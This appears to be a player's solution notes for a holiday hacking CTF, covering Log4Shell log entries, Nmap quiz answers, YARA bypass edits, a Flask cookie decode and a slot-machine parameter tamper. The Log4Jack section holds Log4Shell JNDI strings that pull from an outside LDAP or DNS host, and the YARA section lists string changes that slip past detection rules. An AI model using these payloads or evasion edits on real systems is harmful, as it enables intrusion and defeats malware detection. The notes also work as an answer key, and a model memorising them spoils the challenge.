
# Orientation

Follow directions

# Logic Munchers

Just have to play the game

# Bonus! Blue Log4Jack

Follow directions

# Bonus! Red Log4Jack

[14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"

# NMAP challenge:

## Answer all the questions in the quizme executable:

### What port does 34.76.1.22 have open? 

`62078`

### What port does 34.77.207.226 have open? 

`8080`

### How many hosts appear "Up" in the scan? 

`26054`

### How many hosts have a web port open?  (Let's just use TCP ports 80, 443, and 8080) 

`14372`

```
grep -E "(80|8080|443)/open" bigscan.gnmap | sort |  uniq | wc -l
```

### How many hosts with status Up have no (detected) open TCP ports? 

`402`

```
echo $((`grep Up | wc -l` - `grep 'open/tcp' | wc -l`))
```

### What's the greatest number of TCP ports any one host has open? 

`12`

```
grep -E "(open.*){12,}" | wc -l
```

# YARA Bypass

## rule yara_rule_135 

```   
{
   meta:
      description = "binaries - file Sugar_in_the_machinery"
      author = "Sparkle Redberry"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-21"
      hash = "19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488"
   strings:
      $s = "candycane"
   condition:
      $s
}
```

- Change **candycane** to `c@ndycane`

## rule yara_rule_1056 

```   
{
   meta:
      description = "binaries - file frosty.exe"
      author = "Sparkle Redberry"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-21"
      hash = "b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03"
   strings:
      $s1 = {6c 6962 632e 736f 2e36}
      $hs2 = {726f 6772 616d 2121}   #Hex for rogram!!
   condition:
      all of them
}    
```

- Change **rogram!!** to `rogram?!`

## rule yara_rule_1732 

```
{
   meta:
      description = "binaries - alwayz_winter.exe"
      author = "Santa"
      reference = "North Pole Malware Research Lab"
      date = "1955-04-22"
      hash = "c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8"
   strings:
      $s1 = "This is critical for the execution of this program!!" fullword ascii #
      $s2 = "__frame_dummy_init_array_entry" fullword ascii                       #
      $s3 = ".note.gnu.property" fullword ascii
      $s4 = ".eh_frame_hdr" fullword ascii					  #
      $s5 = "__FRAME_END__" fullword ascii					  #
      $s6 = "__GNU_EH_FRAME_HDR" fullword ascii					  #
      $s7 = "frame_dummy" fullword ascii
      $s8 = ".note.gnu.build-id" fullword ascii
      $s9 = "completed.8060" fullword ascii
      $s10 = "_IO_stdin_used" fullword ascii
      $s11 = ".note.ABI-tag" fullword ascii
      $s12 = "naughty string" fullword ascii					#
      $s13 = "dastardly string" fullword ascii					#
      $s14 = "__do_global_dtors_aux_fini_array_entry" fullword ascii		#
      $s15 = "__libc_start_main@@GLIBC_2.2.5" fullword ascii  			#
      $s16 = "GLIBC_2.2.5" fullword ascii
      $s17 = "its_a_holly_jolly_variable" fullword ascii  			#
      $s18 = "__cxa_finalize" fullword ascii					#
      $s19 = "HolidayHackChallenge{NotReallyAFlag}" fullword ascii		#
      $s20 = "__libc_csu_init" fullword ascii
   condition:
      uint32(1) == 0x02464c45 and filesize < 50KB and
      10 of them
}
```

- Change **HolidayHackChallenge{NotReallyAFlag}** to `HolidayHackChalleng3{NotReallyAFlag}`
- Change **dastardly string** to `datardly_string`
- Change **naughty string** to `naughty_string`
- Change **__frame_dummy_init_array_entry** to `__fram3_dummy_init_array_entry`
- Change **__do_global_dtors_aux_fini_array_entry** to `__d0_global_dtors_aux_fini_array_entry`
- Change **its_a_holly_jolly_variable** to `its_a_ho1ly_jolly_variable`
- Change **.eh_frame_hdr** to `.eh_frame_hDr`
- Change **\_\_FRAME_END\_\_** to `__FRAME_3ND__`
- Change **__GNU_EH_FRAME_HDR** to `__GNU_EH_FRAM3_HDR`
- Change **__cxa_finalize** to `__cx@_finalize`
- Change **__libc_start_main@@GLIBC_2.2.5** to `__libc_start_ma1n@@GLIBC_2.2.5`

# EXIFtool challenge

```
exiftool 2021-12-*.docx | less /Jack
```

`Caramel Santaigo`

Decoded Flask cookies Cyberchef from Base64 url safe zlib inflate

```
{"elf":"Tinsel Upatree","elfHints":["They kept checking their Snapchat app.","The elf mentioned something about Stack Overflow and Python.","Oh, I noticed they had a Star Trek themed phone case.","The elf got really heated about using tabs for indents.","hard"],"location":"Santa's Castle","options":[["Antwerp, Belgium","Prague, Czech Republic","New York, USA"],["Edinburgh, Scotland","Stuttgart, Germany","Reykjav\u00edk, Iceland"],["Montr\u00e9al, Canada","Antwerp, Belgium","Prague, Czech Republic"],["Rovaniemi, Finland","Placeholder","Tokyo, Japan"]],"randomSeed":721,"route":["New York, USA","Edinburgh, Scotland","Antwerp, Belgium","Placeholder"],"victoryToken":"{ hash:\"3852c096dcc7d6403ed61a0b247e979d28bca9714c25faa4956f2196ae7afb11\", resourceId: \"65485b84-6a1d-4dac-afcb-a43bbe34d01e\"}"}
{"elf":"Ribb Bonbowford","elfHints":["Oh, I noticed they had a Star Wars themed phone case.","The elf mentioned something about Stack Overflow and C#.","The elf got really heated about using tabs for indents.","They kept checking their Slack app.","hard"],"location":"Santa's Castle","options":[["Copenhagen, Denmark","Antwerp, Belgium","New York, USA"],["Edinburgh, Scotland","Reykjav\u00edk, Iceland","Stuttgart, Germany"],["Edinburgh, Scotland","Rovaniemi, Finland","New York, USA"],["New York, USA","Edinburgh, Scotland","Placeholder"]],"randomSeed":884,"route":["Antwerp, Belgium","Stuttgart, Germany","Edinburgh, Scotland","Placeholder"],"victoryToken":"{ hash:\"b2f333cb6d56c7329fb71f29ed29dd2c37861251290a29fc5649c44e37a23b13\", resourceId: \"f01c68fb-30e7-471c-aad3-380395e2cac6\"}"}
```

# Parameter tampering slot machine

Change **cpl** to negative value to increase winnings